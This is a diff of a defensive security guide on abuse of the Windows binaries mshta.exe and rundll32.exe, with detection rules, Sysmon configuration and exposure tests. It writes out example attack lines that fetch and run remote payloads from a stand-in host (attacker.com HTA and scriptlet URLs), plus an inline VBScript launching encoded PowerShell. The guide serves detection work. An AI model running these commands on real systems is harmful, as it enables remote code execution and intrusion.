@@ -118,28 +118,34 @@ Flag any certutil invocation containing `-urlcache`, `-decode`, `-encode`, or a 
 
 ### How It Gets Abused
 
-Because mshta runs scripts from remote URLs without writing a traditional executable to disk, it is a common phishing delivery vehicle. The payload lives on an attacker-controlled server. The victim runs one command or clicks one link, and execution happens through a trusted Microsoft binary.
+Because mshta executes scripts fetched from remote URLs without dropping a traditional executable to disk, it is a common phishing delivery vehicle. The payload lives on an attacker-controlled server. The victim runs one command or clicks one link, and execution happens through a trusted Microsoft binary.
 
 **Remote HTA execution:**
 ```
 mshta.exe http://attacker.com/payload.hta
 ```
 
-The `.hta` file is fetched and executed in memory. A typical payload spawns a reverse shell or stages a second-stage loader using VBScript or JScript.
+The `.hta` file is fetched and executed by mshta. It is worth noting that mshta writes a temporary copy of the retrieved file to the IE/Edge cache before execution, so the technique is not fully fileless. No traditional executable lands in an obvious location, but the file does touch disk. A typical payload spawns a reverse shell or stages a second-stage loader using VBScript or JScript.
 
 **Inline script execution (no remote file required):**
 ```
 mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe -enc [base64]"",0:close")
 ```
 
-This passes the entire script as a command-line argument. Nothing is written to disk. The process tree is: `mshta.exe` spawns `powershell.exe`. Without parent-process visibility, the PowerShell invocation looks like any other.
+This passes the entire script as a command-line argument. Nothing is written to disk. The process tree is `mshta.exe` spawning `powershell.exe`. Without parent-process visibility, the PowerShell invocation looks like any other.
+
+The `javascript:` protocol works the same way and appears in campaigns with equal frequency:
+```
+mshta.exe javascript:a=GetObject("script:http://attacker.com/payload.sct");a.Exec();close();
+```
+
+Both variants are in-process execution through a signed binary with no traditional file drop, making them attractive for operators trying to minimize their footprint.
 
 **MITRE ATT&CK mapping:** [T1218.005 - System Binary Proxy Execution: Mshta](https://attack.mitre.org/techniques/T1218/005/)
 
 ### Testing Exposure
 
 Create a benign `.hta` file locally and execute it to verify command-line logging captures the invocation:
-
 ```html
 <html>
 <head>
@@ -150,7 +156,6 @@ Create a benign `.hta` file locally and execute it to verify command-line loggin
 </head>
 </html>
 ```
-
 ```
 mshta.exe C:\temp\test.hta
 ```
@@ -169,7 +174,6 @@ Note whether your proxy or EDR generates any alert. If neither fires on a remote
 **AppLocker / WDAC policy.** If your environment uses Application Control, mshta.exe can be blocked outright for standard users. Microsoft's App Control for Business recommended block rules explicitly name mshta as a known proxy execution binary, one of roughly forty binaries on that list that Microsoft itself recommends denying unless your use case requires them.
 
 **Detection: parent-child process anomalies.** Flag `mshta.exe` spawning any of the following child processes:
-
 ```yaml
 detection:
   selection:
@@ -180,11 +184,14 @@ detection:
       - '\powershell.exe'
       - '\wscript.exe'
       - '\cscript.exe'
+      - '\wmic.exe'
+      - '\mshta.exe'
   condition: selection
 ```
 
-**Detection: mshta.exe with URL in command line:**
+`wmic.exe` is included because mshta has been used to execute WMI-based reconnaissance and lateral movement in several documented campaigns. A second `mshta.exe` instance spawned by the first is a known technique for staging a follow-on payload while the parent handles decoy behavior.
 
+**Detection: mshta.exe with URL or inline script in command line:**
 ```yaml
 detection:
   selection:
@@ -198,7 +205,7 @@ detection:
   condition: selection
 ```
 
-Legitimate mshta invocations in enterprise environments point to local or UNC paths, not public URLs.
+Legitimate mshta invocations in enterprise environments point to local or UNC paths, not public URLs or inline script protocols. Either condition in this rule on a managed workstation warrants investigation.
 
 ---
 
@@ -207,7 +214,6 @@ Legitimate mshta invocations in enterprise environments point to local or UNC pa
 ### How It Works
 
 `rundll32.exe` is a Windows utility for executing functions exported by DLL files. Its intended use is to load a DLL and call a specific exported function:
-
 ```
 rundll32.exe shell32.dll,Control_RunDLL desk.cpl
 ```
@@ -216,7 +222,7 @@ That example opens Display Properties. The binary is ubiquitous, signed, and exp
 
 ### How It Gets Abused
 
-Because rundll32 loads and executes arbitrary DLL code, it is a flexible proxy execution primitive. An attacker who can write a DLL to disk (or access a remote share) can execute code through a signed system binary.
+Because rundll32 loads and executes arbitrary DLL code, it's a flexible proxy execution primitive. An attacker who can write a DLL to disk (or access a remote share) can execute code through a signed system binary.
 
 **Execute arbitrary DLL:**
 ```
@@ -230,29 +236,32 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
 
 This technique leverages the `RunHTMLApplication` export from `mshtml.dll` to execute a remote scriptlet. It is non-functional on Windows 10 1903 and later with standard patch levels due to changes in the script engine and WDAC block rules. It still appears in campaigns targeting legacy or unpatched environments and is worth understanding for that reason, but it should not be treated as a reliable modern primitive.
 
-**Execute via COM object (squiblydoo variant using regsvr32 is better known, but rundll32 has similar vectors):**
+**Execute via url.dll (legacy, increasingly mitigated):**
 ```
 rundll32.exe url.dll,OpenURL http://attacker.com/payload.hta
 ```
 
-`url.dll` is a legitimate Windows library for handling URL protocols. `OpenURL` will fetch and execute the remote HTA through the shell.
+`url.dll` is a legitimate Windows library for handling URL protocols. `OpenURL` will fetch and pass the target to the shell handler for the given file type, which on older systems would execute a remote HTA through mshta. Like the mshtml technique above, this vector is largely mitigated on modern patched Windows and should be understood as a legacy primitive rather than a reliable current capability. It remains relevant when scoping engagements against unpatched or older environments.
 
 **MITRE ATT&CK mapping:** [T1218.011 - System Binary Proxy Execution: Rundll32](https://attack.mitre.org/techniques/T1218/011/)
 
 ### Testing Exposure
 
-Test whether rundll32 can spawn a child process:
-
+Test whether rundll32 can spawn a child process using the url.dll vector:
 ```
 rundll32.exe url.dll,OpenURL http://example.com/test.hta
 ```
 
-Test whether your EDR or SIEM captures the command line and flags the child process relationship.
+On a modern patched host this should fail or produce no meaningful execution. If it succeeds and your EDR does not fire, you have two problems. Also test a local DLL load to confirm Sysmon EID 7 is capturing image load events:
+```
+rundll32.exe shell32.dll,Control_RunDLL desk.cpl
+```
+
+Check that the resulting Sysmon event captures the DLL path, signature status, and the loading process. If image load telemetry is missing or the signature field is not populated, your Sysmon configuration needs attention before the detection rules below will produce reliable output.
 
 ### The Defense
 
 **Sysmon Event ID 7 (Image Loaded) for unsigned DLLs loaded by rundll32.** This is high-value telemetry. If rundll32 loads a DLL that is not signed by a trusted publisher, that is worth investigating. Configure Sysmon's ImageLoad rule to capture DLLs loaded by rundll32:
-
 ```xml
 <RuleGroup name="" groupRelation="or">
   <ImageLoad onmatch="include">
@@ -263,8 +272,22 @@ Test whether your EDR or SIEM captures the command line and flags the child proc
 
 This will be noisy at first. Tune against your baseline of known-good DLL load patterns.
 
-**Detection: rundll32 with network indicators or suspicious arguments:**
+**Detection: rundll32 spawning child processes.** This is a higher-fidelity signal than argument-string matching alone. Rundll32 has legitimate reasons to appear with varied argument formats, but spawning interactive child processes is not one of them:
+```yaml
+detection:
+  selection:
+    EventID: 4688
+    ParentProcessName|endswith: '\rundll32.exe'
+    NewProcessName|endswith:
+      - '\cmd.exe'
+      - '\powershell.exe'
+      - '\wscript.exe'
+      - '\cscript.exe'
+      - '\mshta.exe'
+  condition: selection
+```
 
+**Detection: rundll32 with network indicators or suspicious arguments:**
 ```yaml
 detection:
   selection:
@@ -279,10 +302,9 @@ detection:
   condition: selection
 ```
 
-**Detection: rundll32 with no command-line arguments.** Legitimate rundll32 invocations always include a DLL and a function name. Rundll32 executing with an empty or malformed argument string is a strong indicator of process hollowing or in-memory injection.
+**Detection: rundll32 with no command-line arguments.** Legitimate rundll32 invocations include a DLL and a function name. Rundll32 executing with an empty or malformed argument string is a high-fidelity indicator of process hollowing or in-memory injection, though some legitimate software invokes rundll32 with no visible arguments through COM activation paths. Treat this as a strong signal requiring investigation rather than a confirmed indicator on its own.
 
 **Block rundll32 from making outbound connections** at the host firewall level. Legitimate use cases for rundll32 reaching the internet are essentially nonexistent in managed environments.
-
 
 ---
 
